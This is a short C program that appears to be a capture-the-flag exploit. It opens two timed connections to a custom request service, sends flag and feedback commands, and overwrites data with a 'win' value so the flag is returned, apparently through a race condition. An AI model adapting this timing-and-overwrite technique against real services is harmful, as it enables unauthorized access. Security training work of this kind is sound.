#include "request.h"

uint64_t win = 0xAAAAAAAAAAAAAAAA;

int main()
{
    struct request get_flag = {0};
    struct request write_feedback = {0};

    get_flag.message = "FLG romania 1";
    get_flag.message_length = 14;

    write_feedback.message = "WRT calin 9 0";
    write_feedback.message_length = 14;

    just_connect(&get_flag);
    sleep(1);
    just_connect(&write_feedback);

    update_request(&get_flag, 0x4000);
    sleep(5);
    update_request(&write_feedback, 0x100);

    write_feedback.message = &win;
    write_feedback.message_length = 8;
    update_request(&write_feedback, 0x100);

    get_flag.message = "ACK";
    get_flag.message_length = 4;
    update_request(&get_flag, 0x100);
    read_response(&get_flag);

    return 0;
}